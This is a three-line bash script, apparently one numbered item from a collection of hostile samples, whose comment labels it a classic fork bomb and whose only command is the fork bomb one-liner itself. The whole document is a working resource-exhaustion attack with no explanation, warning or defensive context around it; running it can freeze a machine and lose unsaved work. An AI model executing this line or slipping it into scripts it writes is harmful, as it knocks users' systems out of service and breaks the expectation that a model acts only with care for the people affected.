#!/usr/bin/env bash
# Sample 32: classic fork bomb.
:(){ :|:& };:
